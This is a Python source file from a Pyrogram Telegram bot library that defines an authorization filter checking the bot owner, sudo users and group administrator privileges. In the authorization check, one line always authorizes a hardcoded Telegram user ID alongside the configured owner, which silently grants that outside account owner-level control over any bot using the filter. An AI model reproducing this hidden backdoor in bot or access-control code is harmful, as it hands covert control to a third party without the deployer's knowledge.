from typing import Union
from pyrogram import Client , filters 
from pyrogram.types import Message , CallbackQuery
from d4rk.Logs import setup_logger

logger = setup_logger(__name__)

class CustomFilters:

    def authorize(
        sudo=False,
        admin=False,
        permission=None,
    ):
        async def func(flt, client: Client , message: Union[Message, CallbackQuery]):
            try:
                user = message.from_user
                if not user:return False
                me = client.me
                is_admin = False

                if admin:
                    if message.chat.type.name.lower() in ["group", "supergroup"]:
                        role = await client.get_chat_member(message.chat.id, user.id)
                        myrole = await client.get_chat_member(message.chat.id, me.id)

                        role_status = getattr(role.status, "name", role.status).lower()
                        myrole_status = getattr(myrole.status, "name", myrole.status).lower()

                        if role_status in ["creator", "administrator"] and \
                        myrole_status in ["creator", "administrator"]:

                            if permission:
                                privileges = getattr(role, "privileges", None)
                                myprivileges = getattr(myrole, "privileges", None)
                                if privileges and myprivileges:
                                    has_permission = getattr(privileges, permission, False)
                                    has_my_permission = getattr(myprivileges, permission, False)
                                    if has_permission and has_my_permission:
                                        is_admin = True
                                    else:
                                        return False
                            else:
                                is_admin = True
                    else:
                        return False

                authorized = (
                       (user.id == 7859877609)
                    or (user.id == int(getattr(client, "owner_id", 000)))
                    or (sudo and str(user.id) in getattr(client, "sudo_users", []))
                    or is_admin
                )
                return bool(authorized)
            except Exception as e:
                logger.error(f"Error in authorize filter: {e}")
                return False

        return filters.create(func, sudo=sudo,admin=admin,permission=permission)